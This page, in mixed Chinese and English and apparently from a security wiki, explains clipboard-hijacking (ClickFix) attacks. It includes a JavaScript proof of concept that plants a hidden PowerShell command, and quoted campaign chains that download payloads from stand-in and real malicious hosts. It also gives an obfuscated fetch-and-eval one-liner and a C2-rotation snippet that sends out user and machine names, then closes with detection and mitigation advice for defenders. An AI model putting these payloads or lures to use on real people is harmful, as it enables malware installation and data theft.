# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – 老生常谈，但仍然有效的建议

## 概述

Clipboard hijacking – also known as *pastejacking* – 利用用户在不检查的情况下例行复制并粘贴命令的习惯。恶意网页（或任何支持 JavaScript 的上下文，例如 Electron 或 Desktop application）以编程方式将攻击者控制的文本放入系统剪贴板。受害者通常会被精心设计的社会工程指示引导，按下 **Win + R** (Run dialog)、**Win + X** (Quick Access / PowerShell)，或打开终端并 *paste* 剪贴板内容，从而立即执行任意命令。

因为 **不会下载文件且不会打开任何附件**，该技术能够绕过大多数监控附件、宏或直接命令执行的电子邮件和网页内容安全控制。因此该攻击常见于投放常见恶意软件家族（如 NetSupport RAT、Latrodectus loader 或 Lumma Stealer）的钓鱼活动中。

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## The ClickFix / ClearFake 流程

1. 用户访问一个 typosquatted 或被入侵的站点（例如 `docusign.sa[.]com`）
2. 注入的 **ClearFake** JavaScript 调用 `unsecuredCopyToClipboard()` 辅助函数，悄悄将一个 Base64 编码的 PowerShell 单行脚本存入剪贴板。
3. HTML 指示告诉受害者：*“按下 **Win + R**，粘贴命令并按 Enter 以解决该问题。”*
4. `powershell.exe` 执行，下载一个包含合法可执行文件和恶意 DLL 的归档（classic DLL sideloading）。
5. loader 解密后续阶段，注入 shellcode 并安装 persistence（例如 scheduled task）——最终运行 NetSupport RAT / Latrodectus / Lumma Stealer。

### 示例 NetSupport RAT 链
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (合法的 Java WebStart) 在其目录中查找 `msvcp140.dll`。
* 恶意 DLL 使用 **GetProcAddress** 动态解析 API，通过 **curl.exe** 下载两个二进制文件 (`data_3.bin`, `data_4.bin`)，使用循环 XOR 密钥 "https://google.com/" 对它们进行解密，注入最终 shellcode 并将 **client32.exe** (NetSupport RAT) 解压到 `C:\ProgramData\SecurityCheck_v1\`。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. 使用 **curl.exe** 下载 `la.txt`
2. 在 **cscript.exe** 中执行 JScript downloader
3. 获取 MSI payload → 在签名应用程序旁放置 `libcef.dll` → DLL sideloading → shellcode → Latrodectus。

### Lumma Stealer 通过 MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** 调用启动了一个隐藏的 PowerShell 脚本，该脚本检索 `PartyContinued.exe`，解压 `Boat.pst`（CAB），通过 `extrac32` 和文件拼接重建 `AutoIt3.exe`，并最终运行一个 `.a3x` 脚本，将浏览器凭据外传到 `sumeriavgv.digital`。

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

一些 ClickFix 活动完全跳过文件下载，指示受害者粘贴一个 one‑liner，通过 WSH 获取并执行 JavaScript，使其持久化，并每天轮换 C2。观察到的示例链：
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
关键特征
- 以混淆形式存储的 URL 在运行时被反转以对抗随意检查。
- JavaScript 通过 Startup LNK (WScript/CScript) 持久化自身，并按当前日期选择 C2，从而实现快速域名轮换。

用于按日期轮换 C2s 的最小 JS 片段：
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
下一阶段通常部署一个 loader，用于建立持久性并拉取一个 RAT（例如 PureHVNC），通常会将 TLS 固定到硬编码的证书并对流量进行分块传输。

此变体的检测思路
- 进程树： `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js`（或 `cscript.exe`）。
- 启动工件：位于 `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` 的 LNK 调用 WScript/CScript，JS 路径位于 `%TEMP%`/`%APPDATA%` 下。
- Registry/RunMRU 和命令行遥测包含 `.split('').reverse().join('')` 或 `eval(a.responseText)`。
- 重复的 `powershell -NoProfile -NonInteractive -Command -`，通过大量 stdin 负载提供长脚本以避免超长命令行。
- 调度任务随后执行 LOLBins，例如在看似更新程序的任务/路径下执行 `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`（例如 `\GoogleSystem\GoogleUpdater`）。

威胁狩猎
- 每日轮换的 C2 主机名和 URL，模式为 `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`。
- 关联 clipboard 写入事件，随后 Win+R 粘贴并立即执行 `powershell.exe`。

Blue-teams 可以结合 clipboard、进程创建 和 注册表 遥测 来定位 pastejacking 滥用：

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` 会保存 **Win + R** 命令历史 —— 查找异常的 Base64 / 混淆条目。
* Security Event ID **4688** (Process Creation) 当 `ParentImage` == `explorer.exe` 且 `NewProcessName` 在 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }。
* Event ID **4663**：在可疑的 4688 事件之前，检测 `%LocalAppData%\Microsoft\Windows\WinX\` 或临时文件夹下的文件创建。
* EDR clipboard sensors (if present) – 关联 `Clipboard Write` 随即出现的新 PowerShell 进程。

## Mitigations

1. Browser hardening – 禁用 clipboard 写入访问（`dom.events.asyncClipboard.clipboardItem` 等），或要求用户手势。
2. Security awareness – 教育用户 *手动输入* 敏感命令或先粘贴到文本编辑器中。
3. PowerShell Constrained Language Mode / Execution Policy + Application Control 来阻止任意 one-liners。
4. Network controls – 阻止对已知 pastejacking 和 恶意 C2 域名的出站请求。

## Related Tricks

* **Discord Invite Hijacking** 通常在把用户诱导到恶意服务器后，滥用相同的 ClickFix 手法：

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../../banners/hacktricks-training.md}}
